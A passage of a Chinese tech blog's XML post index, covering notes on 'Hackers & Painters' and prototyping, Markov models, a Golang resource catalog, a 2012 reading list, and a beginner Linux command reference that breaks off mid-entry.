需要媒体宣传了，就开出一张单子，上面总结了自从上次“发布”以来，我们新增的所有功能，然后在上面填一个新的版本号，发出一个新闻稿，宣布新版本已经准备就绪了。真是神奇啊，从来没有人看穿我们的把戏。 用户需要的设计 用户要求的设计 “顾客永远是对的”，这是指评价优秀设计的标准看它能够多大程度上满足用户的需求。让用户满意并不等于迎合用户的一切要求。用户不了解所有可能的选择，也经常弄错自己真正想要的东西。做一个好的设计师就像做一个好医生一样。你不能头痛医头，脚痛医脚。病人告诉你症状，你必须找出他生病的真正原因，然后针对病因进行治疗。（p214） 将一个构思束之高阁，不仅意味着延迟它的实现，还意味着延迟所有在实现过程中激发的构思。 如果你正在设计某种新东西，就应该尽快拿出原型，听取用户的意见。 今天刚好读到另一篇文章，提出了很多具体的操作方案，可以作为一段注脚吧。作者在邱俊涛 《团队里的两类程序员》 一文中提出，程序员大致可以分为两大类，即： 原型类程序员（prototyper） 产品类程序员（engineer） 原型类程序员适用于项目得早期阶段，或者说 Idea 尚不明确的阶段，设计者基于一个易于修改的媒体介质（比如 HTML+CSS 页面，而不是 Photoshop 原图或“重型”代码），然后向客户及所有项目相关人来确认，然后根据反馈来快速调整。通过快速且轻量级的迭代原型设计，最大可能压缩反馈周期，避免返工。 产品类程序员则更适用于高度产品化的项目，对程序员的要求就会有不同，尤其需要具备严谨的工程实践经验，例如：安全意识、性能意识、容灾、高可用、自动化测试、软件架构、甚至代码管理、部署流程等方方面面，要求的是全生命周期的规范化，尤其注重软件内部质量（邱俊涛用的定语是“深刻而周全”）。 关于快速反馈的观点，个人觉得还有几点不成熟的想法，略作补充： 原型必须 高度仿真，否则未必能收到好的效果，没有人可以在一个失真的想象中做出正确的决策。例如，如果项目背景追求美观和视觉效果，就得要求原型和最终上线版本有完全一样的样式输出；如果是业务逻辑复杂得人机交互，原型就必须包含所有原子操作和全套模拟数据； 包括设计师/BA 等人在内，都要求掌握快速原型方法、轻量级编程能力、具备多样化技术能力（前后端），真正的 Hacker 几乎都是通才； 轻量级的迭代过程同样需要精细化，例如构建通用的模块化原型资源，大量利用 CDN ，全程使用版本管理工具等； 不管采用哪一类程序员，都不存在“物美价廉”这种情况，至少不应成为首先考虑的因素，他们的投入产出比都有公允的市场价格体现。 扩展阅读 IT科技史漫谈：Linus Torvalds 与 Linux 操作系统 中文翻译| Linus Torvalds: The mind behind Linux TED现场版| The mind behind Linux 《枪，帆船，帝国：技术革新在1400-1700年欧洲扩张早期阶段的作用》 （Guns, Sails, and Empires: Technological Innovation and the Early Phases of European Expansion 1400-1700） Carlo Cipolla 著，Pantheon，1965 年出版。 《黑客：计算机革命的英雄》（Hackers: Heroes of the Computer Revolution）| Steven Levy，1984 《刺杀戴高乐》弗雷德里克·福赛思 扩展阅读：《The Cyber-Security Master》 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处网络安全与科技罪案调查科 参考文献 阮一峰 |《黑客与画家：硅谷创业之父Paul Graham文集》 邱俊涛 | 团队里的两类程序员]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[概率论基础：从马尔可夫模型（Markov Model）到贝叶斯网络]]></title>
    <url>%2F2017%2F05%2F09%2FMathmetics-Markov-Model%2F</url>
    <content type="text"><![CDATA[摘要 马尔可夫模型（Markov Model ） 隐含马尔可夫模型（ Hidden Markov Model ） 隐含隐马尔可夫模型的应用 马尔可夫链的扩展 —— 贝叶斯网络（Bayesian Network） 19 世纪到 20 世纪初，马尔可夫（Andrey Markov）提出假设，任意一个词 Wi 出现的概率只同它前面的词 Wi-1有关，偷懒但颇为有效的方法。【符合这个假设的随机过程则称为马尔科夫过程，也称为马尔可夫链。】二元模型（ Bigram Model ）对应的公式如下： P(S) = P(W1 ,W2, … , Wn) =P(W1)·P(W2|W1) ·P(W3|W2) ··· P(Wi | Wi-1) ··· P(Wn | Wn-1) 马尔可夫链：符合这个马尔可夫假设的随机过程则称为马尔科夫过程。 123456789digraph markov&#123; label = " Markov 马尔可夫链"; rankdir = LR; m1-&gt;m2[label = "1.0"]; m2-&gt;m3[label = "0.6"]; m3-&gt;m4[label = "0.3"]; m2-&gt;m4[label = "0.4"]; m3-&gt;m3[label = "0.7"];&#125; 隐含马尔可夫模型（ Hidden Markov Model ）最早由20世纪六七十年代，美国数学家鲍姆（ Leonard E. Baum ） 发表的一系列论文中提出。隐含马尔可夫模型是马尔可夫链的一个扩展，即任一时刻 t 的状态 St 是不可见的。但是，在每个时刻 t 会输出一个富豪 Ot ，而且 Ot 和 St 相关且仅和 St 相关。 隐马尔可夫模型的应用隐含马尔可夫模型成功的应用最早是语音识别（Sphinx——大词汇量连续语音识别系统）。根据应用的不同而有不同的名称,例如语音识别中的声学模型（ Acoustic Model ），机器翻译中的翻译模型（ Translation Model ）等。 1、应用领域：翻译 语音识别，声学模型（ Acoustic Model ） 机器翻译，翻译模型（ Translation Model ） 中文断词/分词或光学字符识别 拼写纠错，纠错模型（ Correction Model） 手写体识别 2、应用领域：图像识别3、生物信息学 和 基因组学 基因组序列中蛋白质编码区域的预测 对于相互关联的DNA或蛋白质族的建模 从基本结构中预测第二结构元素 通信中的译码过程 隐含马尔可夫模型的训练 知识背景：概率论 围绕隐含马尔可夫模型的基本问题 给定一个模型，如何计算某个特定输出序列的概率；Forward-Backward 算法参考书 Frederick Jelinek《Statistical Methods for Speech Recognition(Language, Speech, and Communication)》 给定一个模型和某个特定的输出序列，如何找到最可能产生这个输出的状态序列解码算法：维特比算法 给定足够量的观测数据，如何估计隐含马尔可夫模型的参数。绚练算法：鲍姆-韦尔奇算法（Baum-Welch Algorithm） 扩展阅读 读书笔记|数学之美（Beauty Of Mathmetics） 参考文献 马尔科夫模型与离散事件系统仿真模型简析 | 则裕沙龙@立波 从贝叶斯方法谈到贝叶斯网络 | v_JULY_v (结构之法 算法之道) 斯坦福大学公开课-机器学习过程-马尔可夫决策过程 从贝叶斯定理到概率分布：综述概率论基本定义 | 算法与数学之美 实例详解贝叶斯推理的原理 | 2017-10-03 算法与数学之美]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog：玩转编程语言 - Golang 专题]]></title>
    <url>%2F2017%2F05%2F05%2FLanguage-Go-lang%2F</url>
    <content type="text"><![CDATA[摘要 ABC 基于 Golang 的应用 Golang 最佳实践 围棋十诀 一、不得贪胜。二、入界宜缓。三、攻彼顾我。四、弃子争先。五、舍小就大。六、逢危须弃。七、慎勿轻速。八、动须相应。九、彼强自保。十、势孤取和。————（唐）王积薪 一、ABC Go by Example Popular sites, blogs and tutorials for learning and mastering Go Language Learn Go with tests 1.1 Install https://go.googlesource.com/go/ 123456789101112131415tar -C /usr/local/go-$version -xvf go-$version.tar.gzcd /usr/local/go-$version/src./all_bash#compile,build and testunset GOROOTunset GOPATHunset GOAPPATHexport GOROOT=/usr/local/goexport GOPATH=$GOROOT/binexport GOAPPATH=$GOROOT/bin/binexport PATH=$PATH:$GOPATH:$GOAPPATH 1.2 Go Version Manage1234//atom 代码提示go get -u github.com/jstemmer/gotags//源代码目录执行gotags -tag-relative=true -R=true -sort=true -f="tags" -fields=+l . build 1234567891011121314## 交叉编译build-linux: export CGO_ENABLED=0 &amp;&amp; export GOOS=linux &amp;&amp; export GOARCH=amd64 &amp;&amp; go buildbuild-wins: export CGO_ENABLED=0 &amp;&amp; export GOOS=windows &amp;&amp; export GOARCH=amd64 &amp;&amp; go buildbuild-solaris: export CGO_ENABLED=0 &amp;&amp; export GOOS=solaris &amp;&amp; export GOARCH=amd64 &amp;&amp; go build## Go supports Solaris 11 on amd64, but not sparc.To build for sparc you need to use gccgo.## 压缩go build -ldflags &apos;-w -s&apos; 二、基于 Golang 的应用2.1 基于Go语言构建RESTful JSON API2.2 基于Kafka构建事件溯源模式的微服务讨论如何借助Kafka实现分布式消息管理，使用事件溯源（Event Sourcing）模式实现原子化数据处理，使用CQRS模式（Command-Query Responsibility Segregation ）实现查询职责分离，使用消费者群组解决单点故障问题，理解分布式协调框架Zookeeper的运行机制。整个应用的代码实现使用Go语言描述。 2.3 开源技术架构漫谈：应用程序开发中的日志管理2.4 网络数据包的捕获、过滤和分析(Packet Capturing) What is Packet Capturing How can it be used What is libpcap What is tcpdump &amp; winpcap &amp; snoop What is BPF What is gopacket 2.5 数据可视化（五）基于网络爬虫制作可视化图表 基于网络爬虫的可视化图表:golang,goquery 案例：最近十年全国彩票销售变化情况 案例：中国科学院院士分布 数据可视化技术方案:基于 SVG (D3、Raphael)、基于 Canvas（Echarts） 三、Golang 最佳实践3.1 Grammar Tips &amp; Simple Demo Port Forwarding with Go (zupzup.org) A guide to understanding HTTP Request handling and processing in Go Understand Go pointers in less than 800 words there-is-no-pass-by-reference-in-go 让go get显示进度 exec.Command()实时输出 Building a Worker Pool in Golang | Dynamically scalable queue consumer How did I improve latency by 700% using sync.Pool The interface is a tool so that you can wire dependencies just by their behaviour, not by how they implement that behaviour. Golang Interfaces 用 Go Plugin 构建模块化系统 3.2 Specialist: Architecture Using Einstein Vision Within Golang （Waiting）By Rajdeep Dua | Published: May 5, 2017Einstein Vision is a service that helps you build smarter applications by using deep learning to automatically recognize images. It provides an API that lets you use image recognition to build AI-enabled apps. Trying Clean Architecture on Golang: Independent, Testable , and CleanBy Iman TumorangFollow | Passionate and Curious Learner in Software Engineering 【翻译】生活在没有泛型的Go语言世界里 | Cholerae 5 Reasons Why We switched from Python To Go 3.3 Go Repository Walk through JSON with Go Using job queues in Go for resilient systems mux router | Go Router Repository httprouter | Go Router Repository Go packages in R packages NanoDano:Making Tor HTTP Requests with Go | Socket Proxy vlan-nats riot：Go Open Source, Distributed, Simple and efficient Search Engine K6: A modern load testing tool, using Go and JavaScript internationalization-i18n-go goproxygolang实现的高性能http,https,websocket,tcp,udp,socks5代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转，TLS加密传输，协议转换 Advanced Forwarding with Go github.com/elazarl/goproxy Encrypted reverse proxy in Go. TavenLi/port-forward 爬虫(简易型) ：https://github.com/lealife/leacrawler 3.3 Business Product List InfluxDB:时间序列数据库，实时数据场景 Marketstore | The Financial Time Series Database File Manager | Web Browser Books《Introducing Go: Build Reliable, Scalable Programs》 特点：精简 预览链接 Others 《The Little Go Book》 《The Go Programming Language》 特点：基础全面 预览链接 《Go Web Programming》 特点：Web Application 预览链接 Concurrency in Go: Tools and Techniques for Developers 特点：Concurrency 预览链接 《Go Programming Blueprints》 特点：covers a lot of topics，such as web services,command-line tools,microservices and app deployment. 预览链接 Others Karl Seguin book: https://github.com/thewhitetulip/web-dev-golang-anti-textbook/youtube series: https://www.youtube.com/playlist?list=PL41psiCma00wgiTKkAZwJiwtLTdcyEyc4code: http://github.com/thewhitetulip/Tasks Quickstart1234567891011121314151617//通过channel 实现协程间通信// https://golangcaff.com/docs/the-way-to-go/142-covariance-channel/130import ( "fmt" "time")func worker(done chan bool) &#123; time.Sleep(time.Second) // 通知任务已完成 done &lt;- true&#125;func main() &#123; done := make(chan bool, 1) go worker(done) // 等待任务完成 &lt;-done&#125; Tips 一些 package时候的会由于众所周知的原因而无法下载 123unrecognized import path "golang.org/x/sys/unix"cd $GOPATH/src/golang.org/x/git clone --depth=1 https://github.com/golang/xxx.git error handling in Go: more expressive syntax (Slides) High Performance Go | Infoq.com Security Resources Awesome golang Security resources 扩展阅读 玩转编程语言系列 参考文献 GitBook:《深入解析Go》 ipfans:使用vendor管理Golang项目依赖 (推荐)InfoQ:goroutine背后的系统知识 Qu Xiao:Goroutine + Channel 实践 A Dive Into the fmt Package The Relationship Between Interfaces and Reflection Using Go in Devops]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的2012年度盘点]]></title>
    <url>%2F2017%2F04%2F28%2FCheck2012%2F</url>
    <content type="text"><![CDATA[摘要 我的2012年阅读书单 2018:年度盘点 2017:年度盘点 2016:年度盘点 2012:阅读书单 我的2012年阅读书单 不忘初心 最近有读者在微信公众号后台留言，希望我能推荐些对自己影响较大的书籍（不限于人生思想、专业技术等方面）。说实话这个问题还真是很难回答，毕竟我自己都还没活明白呢！焦虑满满、困惑比所知多得多，更何况各人背景不同，前路不同，我所知所能也未必就比别人高明，草率推荐就有好为人师、误人子弟的嫌疑了。 恰好在整理过去的文档资料的时候，发现一份2012年读书笔记，记录了那些年读过的一些东西。以现在的眼光来看，当时的探索最大的意义在于重新构建了历史观。特别是超脱天朝教育体制第一次从世界史的角度认识世界。 大家感兴趣的还是国内史，尤其是古代史中帝王将相的权谋。几年前在一个图书公司的招待会上，我亲耳听到一位作者断言：“历史写作的核心是权谋！”其实真说起来，很多热衷写历史权谋的人，自己不在权力系统里，一生少有操弄权术的机会，多是村夫野老三两杯薄酒后指点江山的悠谬之谈。远如《三国演义》里诸葛亮派将领打仗前要给几个妙计锦囊，近如《甄嬛传》在路上放个鹅卵石让敌人流产，都属于二手权谋家关起门来的臆想，谁信谁倒霉。——–《读史很容易变成谄媚式的揣摩，或者遗老式的缅怀》 总的来说这些阅读的主题非常凌乱，内容良莠不齐，个人的阅读体验也深浅不一，大部分只做到通读而已。人是非常复杂的，很难说会因为读几本书就有根本改变。我们所能做的，无非保持持续阅读、保持持续探索之心，在探索中不断修正航向。 一、历史和社会科学中国史 通读《史记》￼ 秦史: 小说/电影《大秦帝国》、纪录片《复活的军团》 通读《汉书》 ￼ 通读《资治通鉴》 ￼ 魏晋南北朝：李鸿宾、阎步克系列讲座 明史：《明朝那些事儿》（全套） 明史：《血酬定律》 明史：《明季北略》（未深入） 《透过钱眼看中国历史》 宗教专题世界各主要宗教发展简史 世界史 世界通史 英国通史 《Mr Bean》、《英伦见闻录》 德国通史￼ 法国通史 ￼ 俄国通史 ￼ [美]沃尔特-G-莫斯《俄国史》 美国通史 比尔德《美国文明的兴起》 罗荣渠《美国历史通论》 日本通史 《东亚三国志》 北欧通史 荷兰通史 《Golden Age–Bontekoe in Asia》（17世纪班德固船长航海日志） 《大国海盗》 《东亚海域一千年》 语言：法语 （进展甚微） 公民伦理 《美国独立宣言The Declaration of Independence》 托克维尔：《旧制度与大革命》、 《论美国的民主》￼（上卷） 卢梭：《忏悔录》（les confessions）￼第三章 富兰克林：《富兰克林自传》￼ 庞勒《大众心理研究》 野记杂文 《阅微草堂笔记》 《容斋笔记》 《中国巫术史》 《丑陋的中国人》￼ 《摩托日记》 《格萨尔王》 《藏地密码》 《房龙地理》 《林则徐西域记》（未深入） 《海国图志》（缺） 二、艺术鉴赏 《欧洲文化起源研究》 马赛曲 扬基都德 舞台剧￼《南海十三郎》 粤剧《昭君出塞》 粤剧《子建会洛神》 粤语相声：黄俊英 篆刻《中国印史》 三、工程技术&amp;科学 无线电￼ 进展甚微 孙思邈 《千金方》（序） 《中国人的身体和疾病–医学修辞和叙事》 [美]迈克尔-赫-斯通《剖析恶魔》(精神病学分析) 《躁狂抑郁多俊才》 《精子战争》 《微生物与人类》 四、商业 《史记-货殖列传》 《汉书-食货志》 吴晓波《大败局》 莫妮卡-兰利《花旗帝国》 《簿记论》 《哥德堡号中国之旅》 邓九刚《茶叶之路》(中俄) Ben Simpfendorfef《新丝绸之路》、 《香料传奇Spice:The History of a Temptation》 《集装箱改变世界》 《移民法：出入境权研究》 《粤海关志》(未深入) 《近代中国的走私与海关》 2017-04-27 整理更新 分类:我的自传source:https://riboseyim.github.io/2017/04/28/Check2012/]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How Linux Works：BASIC Commands]]></title>
    <url>%2F2017%2F04%2F26%2FLinux-Commands%2F</url>
    <content type="text"><![CDATA[摘要 BASIC Commands Learn By Example 用途分类法软件信息123456$ uname -aLinux NW-DD-APP 2.6.32-642.el6.x86_64 #1 SMP Wed Apr 13 00:51:26 EDT 2016 x86_64 x86_64 x86_64 GNU/Linux$ uname -r2.6.32-642.el6.x86_64$ uname -mx86_64 硬件信息123456789101112$ arch$ lscpu$ cat /proc/cpuinfo$ cat /proc/cpuinfo | grep 'processor' | wc -l # 逻辑CPU个数$ cat /proc/cpuinfo | grep 'physical id' | sort | uniq | wc -l # 物理CPU个数$ cat /proc/cpuinfo | grep 'cpu cores' | wc -l # 每个物理CPU中Core的个数$ cat /proc/meminfo$ fdisk -l$ ifconfig -a$ lspci$ dmidecode -t bios$ dmidecode -q 10 Useful Commands to Collect System and Hardware Information in Linux Linux Commands原文：https://www.howtoforge.com/linux-commands/ 本文的特点是非常简洁，将繁杂的Linux命令行筛选出100条左右，非常适合入门学习。此外，将领域知识以“条目+示例”的方式来整理，类似编字典一样，在编辑的过程中可以促进学习者加深认识，也方便日后持续改进（增加注解、参考文献、索引等），是一种不错的学习方法。最后，整理这些命令行的时候，我体会到操作系统最重要的工作实际就是对文件的管理，创建、移动、查看、编辑、销毁、检索，都是围绕文件的操作，事实上也是实际工作中使用最频繁的需求。对开发者来说，以Linux命令行为模版，命名风格、人机交互、小而美的实现方式，促进自己在其它领域的应用、提高大有裨益。 Adduser/Addgroup分类：权限管理；增加用户、用户组 The adduser and addgroup commands lets you add a new user and group to a system, respectively. Here’s an example for adduser:1234567$ sudo adduser testuserAdding user `testuser&apos; ...Adding new group `testuser&apos; (1003) ...Adding new user `testuser&apos; (1003) with group `testuser&apos; ...Creating home directory `/home/testuser&apos; ...Copying files from `/etc/skel&apos; ...Enter new UNIX password: Arch分类：系统信息；查看CPU架构 The arch command is used to print the machine’s architecture. For example:123$ archi686Not sure what &apos;i686&apos; means? Head here. Cal/Ncal分类：系统信息；查看日历 The cal and ncal commands display a calendar in the output.123456789101112131415161718$ calMarch 2017Su Mo Tu We Th Fr Sa1 2 3 45 6 7 8 9 10 1112 13 14 15 16 17 1819 20 21 22 23 24 2526 27 28 29 30 31$ ncalMarch 2017Su 5 12 19 26Mo 6 13 20 27Tu 7 14 21 28We 1 8 15 22 29Th 2 9 16 23 30Fr 3 10 17 24 31Sa 4 11 18 25 Cat分类：文件管理；查看文件内容The cat command allows you to concatenate files, or data provided on standard input, and print it on the standard output. In layman terms, the command prints the information provided to it, whether through stdin or in the form a file.12$ cat test.txtHello...how are you? Cd分类：文件管理；切换工作目录The cd command is used to change user’s present working directory.1$ cd /home/himanshu/ Chgrp分类：文件管理、权限管理；切换文件所属组The chgrp command allows you to change the group ownership of a file. The command expects new group name as its first argument and the name of file (whose group is being changed) as second argument.1$ chgrp howtoforge test.txt Chmod分类：文件管理、权限管理；切换文件执行权限The chmod command lets you change access permissions for a file. For example, if you have a binary file (say helloWorld), and you want to make it executable, you can run the following command:1chmod +x helloWorld Chown分类：文件管理、权限管理；切换文件所有者The chown command allows you to change the ownership and group of a file. For example, to change the owner of a file test.txt to root, as well as set its group as root, execute the following command:1chown root:root test.txt Cksum分类：文件管理；查看文件属性The cksum command prints the CRC checksum and byte count for the input file.123$ cksum test.txt3741370333 20 test.txtNot sure what checksum is? Head here. Clear分类：人机交互；清屏The clear command is used to clear the terminal screen.1$ clear Cmp分类：文件管理；文件比对 byte-by-byteThe cmp command is used to perform byte-by-byte comparison of two files.12$ cmp file1 file2file1 file2 differ: byte 1, line 1 Comm分类：文件管理；文件比对The comm command is used to compare two sorted files line-by-line. For example, if ‘file1’ contains numbers 1-5 and ‘file2’ contains number 4-8, here’s what the ‘comm’ command produces in this case:1$ comm file1 file2 支持选项：123-1：不显示在第一个文件出现的内容；-2：不显示在第二个文件中出现的内容；-3：不显示同时在两个文件中都出现的内容。 Cp分类：文件管理；文件复制The cp command is used for copying files and directories.1$ cp test.txt /home//himanshu/Desktop/ Csplit分类：文件管理；待补充内容The csplit command lets you split a file into sections determined by context lines. For example, to split a file into two where the first part contains ‘n-1’ lines and the second contains the rest, use the following command: 1$ csplit file1 [n] The two parts are saved as files with names ‘xx00’ and ‘xx01’, respectively. Date分类：系统信息；查看系统时间The date command can be used to print (or even set) the system date and time.12$ dateTue Feb 28 17:14:57 IST 2017 Dd分类：文件管理；待补充内容The dd command copies a file, converting and formatting according to the operands. For example, the following command creates an image of /dev/sda partition.1dd if=/dev/sda of=/tmp/dev-sda-part.img Df分类：文件管理；查看文件系统利用率The df command displays the file system disk space usage in output.123$ df /dev/sda1Filesystem 1K-blocks Used Available Use% Mounted on/dev/sda1 74985616 48138832 23014620 68% / Diff分类：文件管理；文件比对 line-by-lineThe diff command lets you compare two files line by line.1$ diff file1 file2 Diff3分类：文件管理；文件比对,三个文件The diff3 command, as the name suggests, allows you to compare three files line by line.1diff3 file1 file2 file3 Dir分类：文件管理；查看当前目录文件列表The dir command lists directory contents. For example:12$ dirtest1 test2 test.7z test.zip Dirname分类：文件管理；查看当前目录The dirname command strips last component from a file name/path. In layman’s terms, you can think of it as a tool that, for example, removes file name from the file’s absolute path.12$ dirname /home/himanshu/file1/home/himanshu Dmidecode分类：系统信息；查看硬件信息 The dmidecode command prints a system’s DMI (aka SMBIOS) table contents in a human-readable format.12345678910111213$ sudo dmidecode# dmidecode 2.12SMBIOS 2.6 present.50 structures occupying 2056 bytes.Table at 0x000FCCA0.Handle 0x0000, DMI type 0, 24 bytesBIOS InformationVendor: American Megatrends Inc.Version: 080015Release Date: 08/22/2011......... DMI (Desktop Management Interface, DMI)就是帮助收集电脑系统信息的管理系统，DMI信息的收集必须在严格遵照SMBIOS规范的前提下进行。 SMBIOS(System Management BIOS)是主板或系统制造者以标准格式显示产品管理信息所需遵循的统一规范。SMBIOS和DMI是由行业指导机构Desktop Management Task Force (DMTF)起草的开放性的技术标准，其中DMI设计适用于任何的平台和操作系统。 Du分类：文件管理；查看指定目录磁盘利用率The du command displays disk usage of files present in a directory as well as its sub-directories.123456789$ du /home/himanshu/Desktop/92 /home/himanshu/Desktop/Downloads/meld/meld/ui88 /home/himanshu/Desktop/Downloads/meld/meld/vc56 /home/himanshu/Desktop/Downloads/meld/meld/matchers12 /home/himanshu/Desktop/Downloads/meld/meld/__pycache__688 /home/himanshu/Desktop/Downloads/meld/meld16 /home/himanshu/Desktop/Downloads/meld/bin328 /home/himanshu/Desktop/Downloads/meld/data/ui52 /home/himanshu/Desktop/Downloads/meld/data/icons/svg EchoThe echo command displays whatever input text is given to it.12$ echo hello hihello hi Ed分类：文件管理；编辑器ed is a line-oriented text editor.1$ ed 单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。支持选项：1234567A：切换到输入模式，在文件的最后一行之后输入新的内容；C：切换到输入模式，用输入的内容替换掉最后一行的内容；i：切换到输入模式，在当前行之前加入一个新的空行来输入内容；d：用于删除最后一行文本内容；n：用于显示最后一行的行号和内容；w：&lt;文件名&gt;：一给定的文件名保存当前正在编辑的文件；q：退出ed编辑器。 Eject分类：媒体管理；卸载The eject command lets you eject removable media (typically, a CD ROM or floppy disk)1$ eject Env分类：系统信息；查看用户环境变量The env command not only displays the current environment, but also lets you edit it.1$ env Exit分类：交互；退出The exit command causes the shell to exit.1$ exit Expand分类：文件管理；编辑器；将TAB符替换为空格符The expand command converts tabs present in the input file(s) into spaces, and writes the file contents to standard output.1$ expand file1 Expr分类：计算器；表达式The expr command evaluates expressions. For example:12$ expr 1 + 23 Factor分类：计算器；分解质因数The factor command prints the prime factors of the input number.12$ factor 135135: 3 3 3 5 Fgrep分类：文件管理；搜索；匹配指定文件字符 The fgrep command is equivalent to the grep command when executed with the -F command line option. The tool is also known as fixed or fast grep as it doesn’t treat regular expression metacharacters as special, processing the information as simple string instead. For example, if you want to search for dot (.) in a file, and don’t want grep to interpret it as a wildcard character, use fgrep in the following way:1$ fgrep &quot;.&quot; [file-name] Find分类：文件管理；搜索；The find command lets you search for files in a directory as well as its sub-directories.123456789101112$ find test*testtest1test2test.7ztest.ctest.txtMore examples for the Linux Find command:* 14 Practical Examples of Linux Find Command for Beginners* Searching For Files And Folders With The find Command* Finding Files On The Command Line Fmt分类：文件管理；读取文件内容并格式化输出（查看支持选项）fmt is a simple optimal text formatter. It reformats each paragraph in the file passed to it, and writes the file contents to standard output.1$ fmt file1 Fold分类：交互；控制文件内容输出时所占用的屏幕宽度 The fold command wraps each input line to fit in specified width.12345$ fold -w 10Hi my name is himanshu AroraHi my nameis himanshu Arora Free分类：系统信息；性能监测；查看内存利用情况。详细介绍 &gt;&gt;&gt;more&gt;&gt;&gt;The free command displays the amount of free and used memory in the system.12345$ free total used free shared buffers cachedMem: 1800032 1355288 444744 79440 9068 216236-/+ buffers/cache: 1129984 670048Swap: 1832956 995076 837880 Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单(Netflix版) 操作系统原理 | How Linux Works（三）：Memory Grep分类：文件管理；搜索；The grep command searches for a specified pattern in a file (or files) and displays in output lines containing that pattern.12345678$ grep Hello test.txtHello...how are you?More tutorials and examples for the Linux Grep command:* How to use grep to search for strings in files on the shell* How to perform pattern search in files using Grep$ grep -r test /usr Groups分类：文件管理；搜索；The groups command displays the name of groups a user is part of.12$ groups himanshuhimanshu : himanshu adm cdrom sudo dip plugdev lpadmin sambashare Gzip分类：文件管理；压缩The gzip command compresses the input file, replacing the file itself with one having a .gz extension.1$ gzip file1 Gunzip分类：文件管理；解压缩Files compressed with gzip command can be restored to their original form using the gunzip command.1$ gunzip file1.gz Head分类：文件管理；查看文件The head command displays the first 10 lines of the file to standard output1234567891011$ head CHANGELOG.txtBEEBEEP (Secure Lan Messanger)BeeBEEP2.0.4- Some GUI improvements (new icons, file sharing tree load faster)- Always Beep on new message arrived (option)- Favorite users (right click on user and enable star button) is on top of the list- improved group usability- Offline users can be removed from list (right click on an offline user in list and then remove)- Clear all files shared (option)- Load minimized at startup (option) Hostname分类：系统信息；host nameThe hostname command not only displays the system’s host name, but lets them set it as well.12$ hostnamehimanshu-desktop Id分类：系统信息；用户信息The id command prints user and group information for the current user or specified username.12$ id himanshuuid=1000(himanshu) gid=1000(himanshu) groups=1000(himanshu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare) Kill分类：进程管理；The kill command, as the name suggests, helps user kill a process by sending the TERM signal to it.1$ kill [process-id] Killall分类：进程管理；The killall command lets you kill a process by name. Unlike kill - which requires ID of the process to be killed - killall just requires the name of the process.1$ killall nautilus Last分类：安全管理；查看最近登录用户The last command shows listing of last logged in users.1234567$ lasthimanshu pts/11 :0 Thu Mar 2 09:46 still logged inhimanshu pts/1 :0 Thu Mar 2 09:46 still logged inhimanshu :0 :0 Thu Mar 2 09:42 still logged inreboot system boot 4.4.0-62-generic Thu Mar 2 09:41 - 10:36 (00:54)himanshu pts/14 :0 Wed Mar 1 15:17 - 15:52 (00:35)himanshu pts/13 :0 Wed Mar 1 14:40 - down (08:06) Ldd分类：软件包管理；查看一个共享库的依赖The ldd command displays in output dependencies of a shared library.1234$ ldd /lib/i386-linux-gnu/libcrypt-2.19.solinux-gate.so.1 =&gt; (0xb77df000)libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb75da000)/lib/ld-linux.so.2 (0x80088000) Ln分类：文件管理；链接The ln command is used for creating link between files. For example, the following command would create a link named ‘lnk’ to a file with name ‘test.txt’:1$ ln test.txt lnk Locate分类：文件管理；搜索The locate command helps user find a file by name.1$ locate [file-name] Logname分类：登录信息；The logname command prints the user-name of the current user.12$ lognamehimanshu Ls分类：文件管理；查看文件列表The ls command lists contents of a directory in output.1234$ ls progresscapture.png hlist.o progress progress.h sizes.chlist.c LICENSE progress.1 progress.o sizes.hhlist.h Makefile progress.c README.md sizes.o Lshw分类：系统信息；查看硬件信息The lshw command extracts and displays detailed information on the hardware configuration of the machine.12345678910111213$ sudo lshw[sudo] password for himanshu:himanshu-desktopdescription: Desktop Computerproduct: To Be Filled By O.E.M. (To Be Filled By O.E.M.)vendor: To Be Filled By O.E.M.version: To Be Filled By O.E.M.serial: To Be Filled By O.E.M.width: 32 bitscapabilities: smbios-2.6 dmi-2.6 smp-1.4 smp........ Lscpu分类：系统信息；查看硬件信息-CPU The lscpu command displays in output system’s CPU architecture information (such as number of CPUs, threads, cores, sockets, and more).12345678910111213141516171819$ lscpuArchitecture: i686CPU op-mode(s): 32-bit, 64-bitByte Order: Little EndianCPU(s): 1On-line CPU(s) list: 0Thread(s) per core: 1Core(s) per socket: 1Socket(s): 1Vendor ID: AuthenticAMDCPU family: 16Model: 6Stepping: 3CPU MHz: 2800.234BogoMIPS: 5600.46Virtualization: AMD-VL1d cache: 64KL1i cache: 64KL2 cache: 1024K Man分类：帮助；man lets you access reference manual for commands, programs/utilities, as well as functions.1$ man ls Md5sum分类：计算器；md5The md5sum command lets you print or check MD5 (128-bit) checksums.12$ md5sum test.txtac34b1f34803a6691ff8b732bb97fbba test.txt Mkdir分类：文件管理；创建目录The mkdir command lets you create directories.1$ mkdir [dir-name] Mkfifo分类：进程管理The mkfifo command is used to create named pipes.1$ mkfifo [pipe-name] More分类：交互more is basically a filter for paging through text one screenful 